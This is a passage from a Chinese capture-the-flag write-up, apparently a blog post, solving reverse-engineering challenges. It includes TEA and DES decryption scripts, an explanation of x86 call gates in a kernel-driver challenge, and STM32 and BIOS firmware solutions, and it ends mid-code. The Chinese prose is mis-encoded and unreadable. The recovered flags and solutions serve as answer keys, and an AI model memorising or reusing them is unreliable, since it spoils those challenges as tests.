src="https://i.loli.net/2021/02/03/mzFKL9OIEYrMt7y.png" alt="image-20210202225507005"></p><p>å¯¹äºç”Ÿæˆçš„keyï¼Œå› ä¸ºè®¡ç®—æœ‰ç‚¹ç¹çï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥åœ¨ç¨‹åºè¿è¡Œæ—¶ä¿®æ”¹eipåˆ°sub_4110B9å‡½æ•°è¿™é‡Œï¼Œç„¶åå½“ç¨‹åºæ‰§è¡Œåˆ°åé¢æ—¶ç›´æ¥æŸ¥çœ‹keyã€‚</p><p>æœ€åçš„teaåŠ å¯†ï¼Œåªæ˜¯å¤šäº†ä¸€ä¸ªå˜æ¢å­—èŠ‚åºçš„æ“ä½œï¼Œå†™è§£å¯†æ—¶æ³¨æ„ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/02/03/JDPd89soM2nTCh5.png" alt="image-20210202225850439"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] = &#123;<span class="number">0xed</span>, <span class="number">0xe9</span>, <span class="number">0x8b</span>, <span class="number">0x3b</span>, <span class="number">0xd2</span>, <span class="number">0x85</span>, <span class="number">0xe7</span>, <span class="number">0xeb</span>, <span class="number">0x51</span>, <span class="number">0x16</span>, <span class="number">0x50</span>, <span class="number">0x7a</span>, <span class="number">0xb1</span>, <span class="number">0xdc</span>, <span class="number">0x5d</span>, <span class="number">0x9</span>, <span class="number">0x45</span>, <span class="number">0xae</span>, <span class="number">0xb9</span>, <span class="number">0x15</span>, <span class="number">0x4d</span>, <span class="number">0x8d</span>, <span class="number">0xff</span>, <span class="number">0x50</span>,</span><br><span class="line"> <span class="number">0xde</span>, <span class="number">0xe0</span>, <span class="number">0xbc</span>, <span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xbc</span>, <span class="number">0xfe</span>, <span class="number">0xe1</span>&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[] = &#123;<span class="number">0x82ABA3FE</span>, <span class="number">0x0AC1DDCA8</span>, <span class="number">0x87EC6B60</span>, <span class="number">0x0A2394568</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> enc[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = enc[i];</span><br><span class="line">enc[i] = enc[<span class="number">3</span>-i];</span><br><span class="line">enc[<span class="number">3</span>-i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v11 = <span class="number">0x73FF8CA6</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>) <span class="comment">//äº¤æ¢å­—èŠ‚åº</span></span><br><span class="line">&#123;</span><br><span class="line">swap(enc+i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> delat = <span class="number">0xc6ef3720</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>) -= ((*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">3</span>))^(delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))))^((*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">2</span>));</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))) -= ((*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)+<span class="number">1</span>)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">1</span>))^(delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))^((*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">0</span>));</span><br><span class="line">delat += <span class="number">0x61c88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) <span class="comment">//0xc6ef3720</span></span><br><span class="line">&#123;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc + <span class="number">4</span> * i) ^= v11;</span><br><span class="line">v11 -= <span class="number">0x50FFE544</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>) <span class="comment">//äº¤æ¢å­—èŠ‚åº</span></span><br><span class="line">&#123;</span><br><span class="line">swap(enc+i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å†…æ ¸å®‰å…¨"><a href="#å†…æ ¸å®‰å…¨" class="headerlink" title="å†…æ ¸å®‰å…¨"></a>å†…æ ¸å®‰å…¨</h2><h3 id="easy-kernel"><a href="#easy-kernel" class="headerlink" title="easy_kernel"></a>easy_kernel</h3><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªr3å±‚çš„ç¨‹åºå’Œä¸€ä¸ªé©±åŠ¨ç¨‹åºã€‚</p><p>é¦–å…ˆr3å±‚ç¨‹åºçš„æƒ…å†µï¼šçº¢è‰²éƒ¨åˆ†çš„è°ƒç”¨æ˜¯é‡ç‚¹ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/02/03/diJGIjlXLyp41fr.png" alt="image-20210202231743748"></p><p>ç„¶åçœ‹çœ‹å¯¹äºé©±åŠ¨æ–‡ä»¶æƒ…å†µï¼šæˆ‘ä»¬ä¸»è¦å…³æ³¨çš„å°±æ˜¯åç§»é‡ä¸º<strong>IRP_MJ_DEVICE_CONTROL</strong>çš„éƒ¨åˆ†ã€‚<br><img src="https://i.loli.net/2021/02/03/QjNn86sM4qOavhE.png" alt="image-20210202232137464"></p><p>è¿›å…¥sub_401270ï¼ŒæŸ¥çœ‹r0å±‚å¯¹r3å±‚å‘å‡ºè¯·æ±‚çš„å¤„ç†ï¼šçœ‹åˆ°0x222000æ­£æ˜¯r3å±‚ç¨‹åºçš„å€¼ï¼Œå¼€å§‹ä¸€ç›´ä»¥ä¸ºè¿™é‡Œkeyï¼Œæ­£å¥½8ä¸ªå­—èŠ‚ï¼Œï¼Œå› ä¸ºè¯†åˆ«äº†åé¢çš„ç®—æ³•ä¸ºdesã€‚</p><p><img src="https://i.loli.net/2021/02/03/Zkvi2DSbAysKo3Y.png" alt="image-20210202232225017"></p><p>åé¢çš„desåŠ å¯†å¾ˆå¥½è¯†åˆ«å‡ºæ¥ï¼Œç„¶åå¼€å§‹ä½¿ç”¨å¯†æ–‡å’Œä¸Šé¢ä»¥ä¸ºçš„keyè§£å¯†ï¼Œä¸å¯¹ï¼ŒçŒœæµ‹ä¹Ÿæ˜¯ã€‚ã€‚å› ä¸ºr3å±‚çº¢è‰²åœ°æ–¹çš„è°ƒç”¨æˆ‘æ²¡ææ¸…æ¥šçš„ã€‚ã€‚</p><p>æ„Ÿè§‰è¿˜æ˜¯è°ƒè¯•èµ·æ¥æ‰èƒ½åšäº†ï¼Œåœ¨æœ¬åœ°è¿™ä¸ªé©±åŠ¨æœåŠ¡ä¹Ÿæ²¡å¯åŠ¨èµ·æ¥ï¼Œç„¶åæ‰¾äº†ä¸ªxpï¼ŒæˆåŠŸè°ƒè¯•èµ·æ¥ã€‚é¦–å…ˆä»desåŠ å¯†ç»“æœå‘ç°keyå…¶å®æ˜¯å‡flagçš„å‰8ä½ä¸”åé¢è¿˜æœ‰ä¸€ä¸ªåŠ å¯†æ“ä½œã€‚æ‰å‘ç°è¿™ä¸ªå…¶å®å’Œä»r3ä¼ è¿‡æ¥çš„å‚æ•°æ˜¯å¯¹åº”çš„ï¼Œ-1è¿™ä¸ªæ ‡å¿—å¾ˆæ˜æ˜¾äº†ã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/02/03/oDNEmCe5pUcMjr2.png" alt="image-20210202233155105"></p><p>æ¥ä¸‹æ¥å°±æ˜¯çœ‹æœ€åçš„çº¢è‰²ä»£ç è°ƒç”¨ï¼Œä½†åªèƒ½å•æ­¥æ­¥è¿‡ï¼Œä¸€å•æ­¥æ­¥å…¥å°±è“å±ğŸ˜ªã€‚ã€‚ä¹Ÿæ²¡å¿ƒæƒ…å»æ‰¾åŸå› ã€‚ã€‚</p><p>ä½†æˆ‘çŒœæƒ³è¿™ä¸ªæœ€ååŠ å¯†è‚¯å®šæ˜¯ä¸éš¾çš„ï¼Œï¼Œå¼€å§‹æ²¡æ³¨æ„ä»¥ä¸ºæ˜¯ç±»ä¼¼å•è¡¨åŠ å¯†çš„ï¼Œé‚£æˆ‘å¯ä»¥æŠŠ0-255çš„æ¯ä¸ªåŠ å¯†å€¼æ‰¾åˆ°ï¼Œå†æ›¿æ¢ä¸€ä¸‹ï¼Œè¯•äº†å¤šç»„æ•°æ®åï¼Œå‘ç°äº†ç«¯å€ªã€‚ã€‚å¹¶ä¸æ˜¯ç±»ä¼¼å•è¡¨åŠ å¯†ï¼Œçœ‹äº†ä¸€ä¼šäº†ï¼Œï¼Œå‘ç°å°±æ˜¯ä»ä¸€ä½å¼€å§‹ä¸€æ¬¡å¼‚æˆ–åä¸€ä½ã€‚ã€‚hhaâ€¦</p><p>è§£å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> des, ECB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(a)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">tmp = a[i]</span><br><span class="line">a[i] = a[<span class="number">3</span>-i]</span><br><span class="line">a[<span class="number">3</span>-i] = tmp</span><br><span class="line"><span class="keyword">return</span> a[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">178</span>, <span class="number">196</span>, <span class="number">134</span>, <span class="number">213</span>,  <span class="number">84</span>, <span class="number">108</span>,  <span class="number">56</span>, <span class="number">173</span>, <span class="number">189</span>, <span class="number">105</span>, </span><br><span class="line">  <span class="number">212</span>, <span class="number">233</span>,  <span class="number">68</span>,  <span class="number">71</span>,  <span class="number">54</span>,  <span class="number">33</span>, <span class="number">153</span>, <span class="number">145</span>, <span class="number">251</span>,  <span class="number">19</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">228</span>, <span class="number">128</span>,  <span class="number">18</span>, <span class="number">226</span>,  <span class="number">67</span>,  <span class="number">42</span>,  <span class="number">75</span>, </span><br><span class="line">   <span class="number">73</span>, <span class="number">142</span>]</span><br><span class="line">   </span><br><span class="line"><span class="string">'''  </span></span><br><span class="line"><span class="string">ans = []</span></span><br><span class="line"><span class="string">for i in range(0, 32, 4):</span></span><br><span class="line"><span class="string">ans += swap(enc[i:])</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">enc[i] ^= enc[i+<span class="number">1</span>]</span><br><span class="line">enc = bytes(enc)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b'&#125;aglf_T_'</span></span><br><span class="line"></span><br><span class="line">des_obj = des(key, ECB, pad = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">code = des_obj.decrypt(enc)</span><br><span class="line">print(code)</span><br><span class="line"><span class="comment">#flag&#123;WelcOme_to_kerne1_world!&#125;</span></span><br></pre></td></tr></table></figure><p>é¢˜è™½ç„¶æ˜¯åšäº†ï¼Œä½†ä¸Šé¢çº¢è‰²éƒ¨åˆ†çš„è°ƒç”¨åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ã€‚</p><p>ç»è¿‡ä¸€ç•ªæœç´¢ï¼Œé¦–å…ˆä»<strong>call fword ptr</strong>çŸ¥é“äº†è¿™æ˜¯ä¸ªé•¿è°ƒç”¨ï¼Œfwordä»£è¡¨6ä¸ªå­—èŠ‚ã€‚è€Œè¦æƒ³å¼„æ¸…å¤„è¿™ä¸ªå°±è¦äº†è§£windowsä¿æŠ¤æ¨¡å¼ä¸­çš„é•¿è°ƒç”¨å’Œè°ƒç”¨é—¨ï¼Œæ®µæè¿°ç¬¦åŠæ®µé€‰æ‹©å­çš„çŸ¥è¯†äº†ã€‚</p><p>è¿™é‡Œå°±åªç®€å•æ¶‰åŠä¸æœ¬é¢˜ç›¸å…³çš„ï¼š</p><blockquote><ul><li><strong>é•¿è°ƒç”¨å¼€å§‹æ˜¯pushè°ƒç”¨è€…çš„CSå’Œè¿”å›åœ°å€ã€‚å› ä¸ºæœ€åè¿”å›ä¹Ÿæ˜¯å¤šäº†æ“ä½œï¼Œæ‰€ä»¥ä½¿ç”¨çš„retf</strong>ã€‚</li><li><strong>GDTR å¯„å­˜å™¨å­˜æ”¾çš„æ˜¯GDTï¼ˆå…¨å±€æè¿°ç¬¦è¡¨ï¼‰è¡¨çš„ä½ç½®å’Œå¤§å°ï¼Œä½ä¸¤å­—èŠ‚æ˜¯gdtè¡¨çš„å¤§å°ï¼Œé«˜å››å­—èŠ‚æ˜¯gdtè¡¨çš„åœ°å€ã€‚</strong></li><li><strong>sgdtæŒ‡ä»¤è¯»å–GDTRå¯„å­˜å™¨çš„å€¼ã€‚</strong></li><li><strong>æ®µé€‰æ‹©å­æ˜¯ä¸€ä¸ª16ä½çš„æè¿°ç¬¦ï¼ŒæŒ‡å‘äº†å®šä¹‰è¯¥æ®µçš„æ®µæè¿°ç¬¦ï¼Œè€Œæˆ‘ä»¬çš„é•¿è°ƒç”¨ä¹Ÿå°±æ˜¯ä½¿ç”¨çš„æ®µé€‰æ‹©å­æ¥å†³å®šã€‚å…¶ä¸­3è‡³15ä½æ˜¯ä¸€ä¸ªç´¢å¼•ï¼Œåœ¨GDTè¡¨ä¸­æŸ¥æ‰¾å‡ºæ®µæè¿°ç¬¦ï¼›ç¬¬1ï¼Œ2ä½ä¸ºRPLï¼Œä»£è¡¨äº†è¯·æ±‚ç‰¹æƒçš„çº§åˆ«ï¼Œå¦‚0ï¼Œ3ï¼›ç¬¬ä¸‰ä½ä¸ºTIï¼Œå¦‚æœä¸º0ï¼ŒæŸ¥GDTè¡¨ã€‚å¦‚æœä¸º1ï¼ŒæŸ¥LDTè¡¨ï¼Œwindowsä¸­åªç”¨GDTï¼Œæ‰€ä»¥è¿™ä½éƒ½æ˜¯0ã€‚</strong></li><li><strong>è°ƒç”¨é—¨æè¿°ç¬¦ï¼Œå…±8å­—èŠ‚ã€‚é«˜16-31ä½è®°å½•åç§»åœ°å€çš„é«˜åœ°å€ï¼Œä½0-15ä½è®°å½•åç§»åœ°å€çš„ä½åœ°å€ã€‚ä½16-31ä½å³æ˜¯æ®µé€‰æ‹©å­ã€‚</strong></li></ul></blockquote><p>å†æ¥çœ‹çœ‹è°ƒç”¨é—¨ï¼ŒæŒ‡ä»¤æ ¼å¼<strong>CALL CS:EIP</strong>ï¼Œæ³¨ï¼šEIPæ˜¯æ²¡æœ‰ä½¿ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„é•¿è°ƒç”¨åªçœ‹æ®µå¯„å­˜å™¨CSçš„å€¼ï¼Œé€šè¿‡å®ƒæ‰¾åˆ°å¯¹åº”çš„æ®µæè¿°ç¬¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ®µå¯„å­˜å™¨çš„ç»“æ„ï¼š</span><br><span class="line">WORD Selectot  <span class="comment">//æ®µé€‰æ‹©å­</span></span><br><span class="line">WORD Attribute  <span class="comment">//å±æ€§ï¼Œæ®µæè¿°ç¬¦é«˜å››å­—èŠ‚çš„ç¬¬8ä½å¼€å§‹ åˆ°ç¬¬23ä½ç»“æŸ</span></span><br><span class="line">DWORD Base   <span class="comment">//åŸºåœ°å€</span></span><br><span class="line">DWORD Limit <span class="comment">//ç•Œé™</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥çœ‹é¢˜ç›®ä¸­çš„ï¼š</p><p><img src="https://i.loli.net/2021/02/03/dmlE6NWgAMcjuOT.png" alt="image-20210203222138750"></p><p> æ‰€ä»¥è¯´è¦å‘ç°è°ƒç”¨çš„åœ°æ–¹ï¼ŒçœŸæ­£å…³å¿ƒçš„åœ°æ–¹æ˜¯48hã€‚<strong>æ‰§è¡Œçš„ä»£ç åœ°å€ = ï¼ˆé—¨æè¿°ç¬¦ä¸­æ®µé€‰æ‹©å­æ‰€æŒ‡å‘çš„ä»£ç æ®µçš„Baseï¼‰+ï¼ˆé—¨æè¿°ç¬¦é«˜å››å­—èŠ‚çš„16-31ä½ï¼‰+ï¼ˆé—¨æè¿°ç¬¦ä½å››å­—èŠ‚çš„0-15ä½ï¼‰ã€‚</strong></p><p>é‚£é¢˜ç›®åœ¨å“ªé‡Œæ‰¾è¿™ä¸ªæ®µæè¿°ç¬¦è¡¨ï¼Ÿå°±æ˜¯ä¹‹å‰çœ‹è¿‡çš„DeviceIoControlçš„åœ°æ–¹ï¼Œé‚£8ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚</p><p><img src="https://i.loli.net/2021/02/03/LTtVxlOFIEq8MHk.png" alt="image-20210203224418059"></p><p>å†æŠŠè°ƒç”¨ä»£ç ä¸­çš„æ®µé€‰æ‹©å­åˆ†è§£ä¸€ä¸‹ï¼ˆ48hï¼‰ï¼Œå¾—åˆ°3-16ä½çš„indexï¼š1001b = 9ã€‚è¿™æ­£å¥½å’Œr0å±‚çœ‹åˆ°çš„ä¸€æ ·ã€‚</p><p>æœ€åå°±æ˜¯ä»è¿™8å­—èŠ‚æ•°æ®å¾—åˆ°é•¿è°ƒç”¨å‡½æ•°åœ°å€äº†ï¼š</p><p><img src="https://i.loli.net/2021/02/03/aVrpT5UY1i7usmy.png" alt="image-20210203225024841"></p><p>å›åˆ°r3å±‚éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/02/03/CTPLONiF39QSxrV.png" alt="image-20210203225120306"></p><h2 id="å›ºä»¶å®‰å…¨"><a href="#å›ºä»¶å®‰å…¨" class="headerlink" title="å›ºä»¶å®‰å…¨"></a>å›ºä»¶å®‰å…¨</h2><h3 id="NodeMCU"><a href="#NodeMCU" class="headerlink" title="NodeMCU"></a><strong>NodeMCU</strong></h3><p>50åˆ†çš„å€¼ï¼Œç›´æ¥ctrl+fæ‰¾åˆ°flagã€‚ã€‚</p><h3 id="STM"><a href="#STM" class="headerlink" title="STM"></a>STM</h3><p>çŸ¥é“äº†stmæ–‡ä»¶ï¼Œè€ŒSTM32å…¶å®æ˜¯ä½¿ç”¨äº†ARMæ ¸çš„MCUã€‚</p><p>è¿™ä¸ªæˆ‘ä»¬å¯ä»¥ç”¨idaåˆ†æçš„ï¼Œä½†è¦è®¾ç½®ä¸€ä¸‹ï¼Œä¸ç„¶idaä¹Ÿåªæ˜¯æŠŠå®ƒå½“æˆdataæ–‡ä»¶çœ‹å¾…ã€‚</p><p>é¦–å…ˆè®¾ç½®æ¶æ„ï¼š</p><p><img src="https://i.loli.net/2021/02/03/8tCAfWjSNszmL6Y.png" alt="image-20210203000903224"></p><p>ç¼–è¾‘é€‰é¡¹ï¼š</p><p><img src="https://i.loli.net/2021/02/03/9AFywDxIStoTVCM.png" alt="image-20210203004015462"></p><p>ç„¶åç¡®å®šï¼ŒæŠŠåŠ è½½åœ°å€æ”¹ä¸ºï¼š0x08000000ã€‚è¿›å…¥åæŠŠå¼€å§‹çš„æ•°æ®éƒ½è½¬åŒ–ä¸º4å­—èŠ‚å‹æ•°æ®ï¼š</p><p><img src="https://i.loli.net/2021/02/03/gnX8JZ9KfrIiqBw.png" alt="image-20210203002010284"></p><p>åŒå‡»ç¬¬äºŒä¸ªè·³è½¬åˆ°æŒ‡å®šä½ç½®ï¼Œç„¶ååœ¨æŒ‡å®šä½ç½®ä¸Šé¢ä¸€äº›åœ°æ–¹æŠŠæ•°æ®è½¬åŒ–ä¸ºä»£ç ã€‚å¯ä»¥å‘ç°idaå·¦è¾¹å‡ºç°äº†å¥½å‡ ä¸ªå‡½æ•°ã€‚ç®€å•æ‰¾ä¸€ä¸‹å³å¯çœ‹è§å…³é”®å‡½æ•°ï¼Œä½¿ç”¨idapythonæŒ‰ç…§å®ƒçš„ç®—æ³•é€»è¾‘æ‰“å°å‡ºè®¡ç®—ç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">addr = <span class="number">0x08000344</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x0800036E</span>:</span><br><span class="line">    flag += chr((get_byte(addr)^<span class="number">0x1e</span>)+<span class="number">3</span>)</span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;1749ac10-5389-11eb-90c1-001c427bd493&#125;</span></span><br></pre></td></tr></table></figure><h3 id="easy-bios"><a href="#easy-bios" class="headerlink" title="easy_bios"></a>easy_bios</h3><p>é¦–å…ˆå°†biosæ–‡ä»¶ä½¿ç”¨æ¨¡æ‹Ÿå™¨è¿è¡Œèµ·æ¥ï¼Œä»è¿™å¾—åˆ°äº†å…³é”®çš„å­—ç¬¦ä¸²ä¿¡æ¯ã€‚</p><p><img src="https://i.loli.net/2021/02/03/fc7N3CXovWQD8ed.png" alt="image-20210203004245893"></p><p>å°è¯•ä½¿ç”¨binwalkæå–biosä¸­çš„æ–‡ä»¶çœ‹çœ‹ï¼Œæå–å‡ºä¸€ä¸ªåä¸º840A8çš„æ–‡ä»¶ã€‚</p><p>ç”¨010editoræŸ¥çœ‹ï¼Œå‘ç°äº†ç†Ÿæ‚‰4D5Aå’Œç´§è·Ÿç€çš„5045ï¼ŒPEæ–‡ä»¶å•Šã€‚ã€‚</p><p><img src="https://i.loli.net/2021/02/03/aIQTxqshEpv9oOm.png" alt="image-20210203005019542"></p><p>çªç„¶æƒ³åˆ°åˆšåˆšå¾—åˆ°çš„å…³é”®å­—ç¬¦ä¿¡æ¯ï¼Œå°è¯•æœç´¢çœ‹çœ‹ï¼Œæ‰¾åˆ°äº†Getflagï¼Œå…¶å®ƒå­—ç¬¦æ¢ç”¨unicodeå½¢å¼ã€‚çªç„¶æ˜æœ—èµ·æ¥ï¼š</p><p><img src="https://i.loli.net/2021/02/03/XCFTuydJxGANan9.png" alt="image-20210203005236702"></p><p>ä½†è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªæ–‡ä»¶ä¸­å¾ˆå¤šä¸ªPEæ–‡ä»¶ï¼Œæå–å‡ºå‡ºç°Getflagå­—ç¬¦ä¸²çš„PEæ–‡ä»¶ï¼Œè¿›è¡Œåç¼–è¯‘ï¼š</p><p>ä»å­—ç¬¦ä¸²å®šä½åˆ°å…³é”®å‡½æ•°ï¼šå†ä»Your Inputå®šä½åˆ°v12æ˜¯æˆ‘ä»¬çš„è¾“å…¥ã€‚<br><img src="https://i.loli.net/2021/02/03/aJQd1xwo76COHX2.png" alt="image-20210203124346558"></p><p>ç„¶åå¯¹äºrc4åŠ å¯†ï¼Œæˆ‘ä»¬åªå…³å¿ƒæœ€åçš„å¼‚æˆ–å€¼ï¼Œç¨‹åºåˆè¿è¡Œä¸èµ·æ¥çš„ï¼Œé‚£æŠŠæ•´ä¸ªå‡½æ•°å¤åˆ¶åˆ°åˆ°Cç¼–è¯‘å™¨ä¸­ç®€å•ä¿®æ”¹ä¸€ä¸‹å†ç›´æ¥ç”¨æ¥å¼‚æˆ–è§£å¯†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> 